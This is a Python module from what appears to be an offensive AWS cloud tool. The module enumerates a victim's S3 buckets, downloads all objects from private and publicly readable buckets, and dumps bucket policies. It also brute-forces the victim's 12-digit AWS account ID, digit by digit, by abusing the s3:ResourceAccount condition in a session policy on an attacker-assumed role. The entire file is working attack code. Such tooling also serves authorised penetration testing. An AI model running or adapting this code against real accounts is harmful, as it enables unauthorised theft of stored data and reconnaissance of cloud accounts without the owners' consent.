import json,sys,os, shutil
import modules.globals as my_globals
from colorama import Fore
from modules.utils import custom_serializer
from aws_assume_role_lib import assume_role
from botocore.exceptions import ClientError

def s3_init_enum(victim_s3_client, s3_unsigned_client, attacker_session, buckets):
    if victim_s3_client:
        found_buckets = list_buckets(victim_s3_client)
        if found_buckets:
            buckets = list(buckets or []) # Prevent list type error
            buckets += found_buckets
        download_private_bucket(victim_s3_client, buckets)
        get_bucket_policy(victim_s3_client, buckets)
    public_buckets = list_public_buckets(s3_unsigned_client, buckets)
    download_public_bucket(s3_unsigned_client, buckets)
    if not my_globals.victim_aws_account_ID:
        if public_buckets and my_globals.attacker_S3_role_arn and attacker_session :
            brute_force_aws_account_id(public_buckets, my_globals.attacker_S3_role_arn, attacker_session)
    else:
        print(f"{Fore.LIGHTBLACK_EX}AWS account ID was found before, or already set. Skipping S3 AWS account ID brute-force.")

def list_buckets(s3_client):
    try:
        print(f"{Fore.GREEN}Enumerating S3 Buckets...")
        found_buckets = []
        buckets = s3_client.list_buckets().get("Buckets", [])
        for bucket in buckets:
            print(f"{Fore.MAGENTA}Found bucket: {bucket['Name']}")
            found_buckets.append(bucket['Name'])
        return found_buckets
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to list S3 buckets")
        return []

def download_private_bucket(s3_client, buckets):
    download_bucket_objects(s3_client, buckets)

def download_public_bucket(s3_unsigned_client, buckets):
    download_bucket_objects(s3_unsigned_client, buckets)

def list_public_buckets(unsigned_s3_client, buckets):
    found_buckets = []
    if buckets:
        print(f"{Fore.GREEN}Checking public S3 buckets without signing...")
        for bucket in buckets:
            try:
                response = unsigned_s3_client.list_objects_v2(Bucket=bucket)
                if 'Contents' in response:
                    print(f"{Fore.MAGENTA}Public access detected on: {bucket}")
                    found_buckets.append(bucket)
                    for obj in response['Contents'][:5]:
                        print(f"{Fore.MAGENTA}- {obj['Key']}")
                else:
                    print(f"{Fore.LIGHTBLACK_EX}No public content or access denied for: {bucket}")
            except Exception as e:
                print(f"{Fore.LIGHTBLACK_EX}Failed to access bucket {bucket} anonymously\n{e}")
    else:
        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping public buckets check")
    return found_buckets

def get_bucket_policy(s3_client, buckets):
    if buckets:
        for bucket in buckets:
            try:
                print(f"{Fore.CYAN}Getting policy for bucket: {bucket}")
                response = s3_client.get_bucket_policy(Bucket=bucket)
                policy = json.loads(response['Policy'])
                print(f"{Fore.MAGENTA}{json.dumps(policy, indent=4, sort_keys=True, default=custom_serializer)}")
            except:
                print(f"{Fore.LIGHTBLACK_EX}Can't get bucket policy: {bucket}")
    else:
        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping bucket policy check")

def create_bucket_dirs(bucket):
    try:
        os.mkdir(bucket)
    except:
        pass

def delete_bucket_dirs(bucket):
    try:
        if os.path.exists(bucket) and os.path.isdir(bucket) and not os.listdir(bucket):
            os.rmdir(bucket)
    except:
        print(f"{Fore.LIGHTBLACK_EX}Failed to delete directory {bucket}")


def download_bucket_objects(s3_client, buckets):
    if not buckets:
        print(f"{Fore.LIGHTBLACK_EX}No buckets provided, skipping download bucket objects")
        return

    for bucket in buckets:
        try:
            print(f"{Fore.CYAN}Processing bucket: {bucket}")
            create_bucket_dirs(bucket)
            os.chdir(bucket)
            bucket_objects = s3_client.list_objects_v2(Bucket=bucket)
            contents = bucket_objects.get("Contents", [])
            if not contents:
                print(f"{Fore.LIGHTBLACK_EX}No objects found in bucket: {bucket}")
                os.chdir("..")
                continue
            total_files = len(contents)
            for i, bucket_contents in enumerate(contents, start=1):
                file_name = str(bucket_contents["Key"])
                sys.stdout.write(f"\r{Fore.MAGENTA}[{i}/{total_files}] Downloading {file_name}")
                sys.stdout.flush()
                try:
                    with open(file_name, "wb") as file:
                        s3_client.download_fileobj(bucket, file_name, file)
                except KeyboardInterrupt:
                    print("\nCtrl+C pressed. Exiting.")
                    sys.exit(0)
                except:
                    print(f"{Fore.LIGHTBLACK_EX} | Failed to download {file_name} from {bucket}")
            print()
            os.chdir("..")
        except KeyboardInterrupt:
            print("\nCtrl+C pressed. Exiting.")
            sys.exit(0)
        except:
            sys.stdout.write(" " * shutil.get_terminal_size((80, 20)).columns + "\r")
            print(f"{Fore.LIGHTBLACK_EX}Can't list bucket: {bucket}")
            os.chdir("..")
            delete_bucket_dirs(bucket)

def brute_force_aws_account_id(public_buckets, s3_role_arn, attacker_session):
    public_bucket = public_buckets[0]
    print(f"{Fore.GREEN}Attempting to brute-force AWS account ID for bucket: {public_bucket}")
    bucket, key = to_s3_args(public_bucket)

    if not can_access_with_policy(attacker_session, bucket, key, s3_role_arn, {}):
        print(f"{Fore.LIGHTBLACK_EX}Role {s3_role_arn} cannot access {bucket}", file=sys.stderr)
        return

    print(f"{Fore.CYAN}Starting brute-force of AWS Account ID (this can take a while)...")
    digits = ""
    for _ in range(12):
        for i in range(10):
            test = f"{digits}{i}"
            policy = get_policy(test)
            if can_access_with_policy(attacker_session, bucket, key, s3_role_arn, policy):
                digits = test
                sys.stdout.write(f"\r{Fore.CYAN}[Brute-forcing.... {digits}]")
                sys.stdout.flush()
                break
    if len(digits) == 12:
        print(f"\n{Fore.MAGENTA}Successfully brute-forced AWS Account ID: {digits}")
        my_globals.victim_aws_account_ID = digits
    else:
        print(f"\n{Fore.LIGHTBLACK_EX}Brute-force failed. Could not determine full 12-digit AWS Account ID.")

def get_policy(digits: str):
    return {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "AllowResourceAccount",
                "Effect": "Allow",
                "Action": "s3:*",
                "Resource": "*",
                "Condition": {
                    "StringLike": {"s3:ResourceAccount": [f"{digits}*"]},
                },
            },
        ],
    }

def can_access_with_policy(session, bucket, key, role_arn, policy):
    if not policy:
        assumed_role_session = assume_role(session, role_arn)
    else:
        assumed_role_session = assume_role(session, role_arn, Policy=policy)

    s3 = assumed_role_session.client("s3")
    if key:
        try:
            s3.head_object(Bucket=bucket, Key=key)
            return True
        except ClientError as e:
            if e.response.get("Error", {}).get("Code") == "403":
                pass
            else:
                raise
    try:
        s3.head_bucket(Bucket=bucket)
        return True
    except ClientError as e:
        if e.response.get("Error", {}).get("Code") == "403":
            pass
        else:
            raise
    return False

def to_s3_args(path: str):
    if path.startswith("s3://"):
        path = path[5:]
    assert path, "no bucket name provided"

    parts = path.split("/")
    if len(parts) > 1:
        return parts[0], "/".join(parts[1:])
    return parts[0], None